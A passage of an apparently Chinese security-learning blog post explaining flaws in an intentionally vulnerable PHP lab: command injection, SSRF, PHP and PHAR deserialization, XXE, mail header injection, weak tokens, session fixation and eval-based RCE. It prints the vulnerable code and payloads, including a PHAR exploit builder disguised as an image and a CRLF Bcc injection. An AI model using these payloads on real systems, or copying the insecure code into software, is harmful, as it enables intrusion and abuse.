class="string">&#x27;/../../data/&#x27;</span> . <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$target</span>)) &#123;  </span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$target</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;文件不存在：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$target</span>).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$target = __DIR__ . &#39;/../../data/&#39; . $file;</code> 试图将访问限制在 data 目录下，但是没有做任何对于 <code>$file</code> 变量的检测。直接导致了路径遍历</p>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;<span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 演示：命令注入（Windows ping），例如：127.0.0.1 &amp; calc  </span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];  </span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;ping -n 1 &#x27;</span> . <span class="variable">$host</span>; <span class="comment">// Windows -n 1  </span></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);  </span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;  </span><br><span class="line">        <span class="comment">// 将 GBK 编码转换为 UTF-8 编码  </span></span><br><span class="line">        <span class="comment">// 使用 //IGNORE 参数忽略无法转换的字符，避免报错  </span></span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;GBK&#x27;</span>, <span class="string">&#x27;UTF-8//IGNORE&#x27;</span>, <span class="variable">$output</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码对输入的 host 没有做任何的过滤，</p>
<p>**常用连接符 </p>
<ul>
<li><code>&amp;</code> : 无论前一条命令是否成功，都执行后一条命令。</li>
<li><code>&amp;&amp;</code> : 只有前一条命令成功，才执行后一条命令。</li>
<li><code>|</code> : 管道符，将前一条命令的输出作为后一条的输入。</li>
<li><code>||</code> : 只有前一条命令失败，才执行后一条命令。</li>
</ul>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$resp</span> = <span class="string">&#x27;&#x27;</span>;<span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 演示：后端请求任意URL，易 SSRF    $u = $_GET[&#x27;url&#x27;];  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$u</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">3</span>);  </span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$resp</span> === <span class="literal">false</span>) &#123; <span class="variable">$msg</span> = <span class="string">&#x27;请求失败：&#x27;</span> . <span class="title function_ invoke__">h</span>(<span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>)); &#125;  </span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>curl_init($u)</code>: cURL 支持多种协议，不仅仅是 HTTP。攻击者可以使用 <code>file://</code>, <code>gopher://</code>, <code>dict://</code>, <code>ftp://</code> 等伪协议。</p>
<p><code>curl_exec</code> 去触发</p>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 演示：不安全反序列化 + 魔术方法  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;dir&#x27;</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="comment">// 演示：在析构中执行命令（极不安全）  </span></span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="comment">// 直接反序列化用户输入（高危）  </span></span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;已反序列化（请在控制台或页面输出查看效果）&#x27;</span>;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;错误：&#x27;</span>.<span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>()).<span class="string">&#x27;&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>@unserialize($data); </code>  直接将用户的输入进行反序列化，在序列化过程结束的时候会触发 <code>__destruct()</code> 魔术方法执行 <code>dir</code><br>所以 payload 为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<h2 id="PHAR-注入"><a href="#PHAR-注入" class="headerlink" title="PHAR 注入"></a>PHAR 注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPhar</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="comment">// 安全的演示操作，避免恶意利用  </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;PHAR反序列化触发成功！&lt;/p&gt;&quot;</span>;  </span><br><span class="line">         </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 演示：调用 getimagesize 对用户可控路径（可能 phar://），触发PHAR元数据反序列化  </span></span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="variable">$data</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$path</span>);  </span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>, <span class="literal">true</span>);  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="title function_ invoke__">h</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>getimagesize</code> 是 PHP 的文件系统函数。当它接收到的路径以 <code>phar://</code> 开头时，PHP 的流包装器（Stream Wrapper）会介入。为了解析 PHAR 文件，PHP 会自动读取并<strong>反序列化</strong>存储在 PHAR 文件 Manifest（清单）区域的元数据（Metadata）</p>
<p>这样的话可以和前面的文件上传打组合拳</p>
<p>paylaod:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPhar</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;whoami&#x27;</span>; </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exploit.phar&quot;</span>);  </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();   </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 关键点：将恶意对象放入 Metadata$o = new TestPhar();  </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在本地生成后修改文件名后缀为 jpg 进行上传</p>
<p>为了让漏洞演示的结果更加明显，把源码修改为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestPhar</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">        <span class="comment">// 安全的演示操作，避免恶意利用  </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;  </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后输入的payload 为<br><code>phar://../../uploads/exploit.jpg</code> </p>
<h2 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;to&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="comment">// 演示：开放重定向，未校验跳转目标  </span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;to&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">exit</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>未做任何过滤，直接跳转。paylaod：<br><code>https://servbay.host/modules/redirect/index.php?to=https://www.baidu.com</code></p>
<h2 id="邮箱头注入"><a href="#邮箱头注入" class="headerlink" title="邮箱头注入"></a>邮箱头注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$to</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;to&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$subj</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;subj&#x27;</span>] ?? <span class="string">&#x27;Test&#x27;</span>;  </span><br><span class="line">    <span class="variable">$from</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;from&#x27;</span>] ?? <span class="string">&#x27;noreply@example.com&#x27;</span>;  </span><br><span class="line">    <span class="variable">$body</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;body&#x27;</span>] ?? <span class="string">&#x27;Hello&#x27;</span>;  </span><br><span class="line">    <span class="comment">// 演示：邮件头注入（CRLF），部分环境发送可能失败，这里仍调用 mail    $headers = &quot;From: &quot; . $from;  </span></span><br><span class="line">    <span class="variable">$ok</span> = @<span class="title function_ invoke__">mail</span>(<span class="variable">$to</span>, <span class="variable">$subj</span>, <span class="variable">$body</span>, <span class="variable">$headers</span>);  </span><br><span class="line">    <span class="variable">$msg</span> = <span class="variable">$ok</span> ? <span class="string">&#x27;已尝试发送（查看服务器邮件配置）&#x27;</span> : <span class="string">&#x27;&lt;span class=&quot;danger&quot;&gt;发送失败或未配置邮件服务&lt;/span&gt;&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP 的 <code>mail()</code> 函数底层是通过调用系统的 sendmail 或 SMTP 协议发送邮件的<br>SMTP 协议通过 <strong>换行符</strong> (<code>\r\n</code>, 即 CRLF, <code>%0d%0a</code>) 来分隔邮件头（Headers）</p>
<p>攻击者可以通过在 <code>$from</code> 字段中插入换行符，来注入新的邮件头，甚至篡改邮件内容</p>
<p>将 <code>from</code> 参数设置为：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim@example.com%0d%0aBcc: spam-target@list.com</span><br></pre></td></tr></table></figure>

<p><strong>服务器端拼接后的 Headers 变成：</strong></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">From: victim@example.com</span><br><span class="line">Bcc: spam-target@list.com  &lt;-- 攻击者成功注入了密送头</span><br></pre></td></tr></table></figure>

<h2 id="弱加密与令牌"><a href="#弱加密与令牌" class="headerlink" title="弱加密与令牌"></a>弱加密与令牌</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$token</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>] ?? <span class="string">&#x27;guest&#x27;</span>;  </span><br><span class="line">    <span class="comment">// 演示：弱令牌生成，使用 md5 + rand，不安全  </span></span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$user</span> . <span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">rand</span>());  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>rand()的取值范围由<code>getrandmax()</code> 决定</p>
<p>这个加密方式通过 用户名 + 时间戳 + 伪随机数生成<br>假设这个 token用于找回密码，攻击者输入受害者的邮箱，点击找回密码，记录此时的Unix时间戳，然后就可以枚举 token 进行爆破。如果成功了就可以重置密码劫持</p>
<h2 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="comment">// 演示：登录后不 regenerate 会话ID，存在固定风险  </span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="number">999</span>;  </span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;demo&#x27;</span>;  </span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;已登录为 demo（未 regenerate 会话ID）&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php 的 SessionID通常存储在Cookie中，攻击者可以通过修改自己的 Cookie来登录</p>
<p>修复方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">session_status</span>() === PHP_SESSION_NONE) &#123; <span class="title function_ invoke__">session_start</span>(); &#125; <span class="comment">//启用会话</span></span><br><span class="line"><span class="title function_ invoke__">session_regenerate_id</span>(<span class="literal">true</span>); <span class="comment">//删除旧的会话文件</span></span><br></pre></td></tr></table></figure>

<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;<span class="variable">$msg</span>=<span class="string">&#x27;&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;  </span><br><span class="line">    <span class="variable">$xml</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="comment">// 演示：开启外部实体解析（危险），可读取本地文件或请求内网  </span></span><br><span class="line">    <span class="title function_ invoke__">libxml_use_internal_errors</span>(<span class="literal">true</span>);  </span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();  </span><br><span class="line">    <span class="variable">$ok</span> = @<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_NONET);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ok</span>) &#123;  </span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$dom</span>-&gt;textContent; <span class="comment">// 展示解析后的文本内容  </span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$errs</span> = <span class="title function_ invoke__">libxml_get_errors</span>();  </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;XML解析错误：&#x27;</span> . <span class="title function_ invoke__">h</span>(<span class="title function_ invoke__">print_r</span>(<span class="variable">$errs</span>, <span class="literal">true</span>));  </span><br><span class="line">        <span class="title function_ invoke__">libxml_clear_errors</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>LIBXML_NOENT</code> 开启后php 解析器会将XML中的实体引用替换为实体定义的内容<br><code>LIBXML_DTDLOAD</code> 许加载外部 DTD（文档类型定义）可以定义外部实体并将其指向服务器上的文件或内网 URL<br><code>LIBXML_NONET</code> 此选项禁止了加载文档时的网络访问,但它通常无法完全防御通过 <code>file://</code> 协议读取本地文件的攻击</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">// 演示目的：直接执行用户提供的 PHP 代码（危险示例）  </span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;缺少参数：code&#x27;</span>;  </span><br><span class="line">    <span class="keyword">exit</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="comment">// 直接 eval 用户输入，导致远程代码执行  </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;执行错误: &#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(), ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为对传入的参数 code 直接进行了 eval()操作，导致了 rce</p>

          
          <div style="margin-top: 50px;">
            <script src="https://giscus.app/client.js"
              data-repo="Licivo/Licivo.github.io"
              data-repo-id="R_kgDOOQU8CQ"
              data-category="Announcements"
              data-category-id="DIC_kwDOOQU8Cc4C0Pub"
              data-mapping="pathname"
              data-strict="0"
              data-reactions-enabled="1"
              data-emit-metadata="0"
              data-input-position="bottom"
              data-theme="preferred_color_scheme"
              data-lang="zh-CN"
              crossorigin="anonymous"
              async>
            </script>
          </div>
        
      </div>

          
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2026/01/15/CSRF%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"
      title="CSRF 漏洞原理"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        CSRF 漏洞原理
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2026/01/13/CC1%20%E5%92%8C%20CC6%20%E7%9A%84Templateslmpld%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/"
      title="CC1 和 CC6 的Templateslmpld实现方式"
     >

    <p class="title-text">
      
        CC1 和 CC6 的Templateslmpld实现方式
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>




    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2026 Licivo<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>
<div class="footer-statistics" style="margin-top: 15px; font-size: 0.85rem; color: #888; text-align: center;">
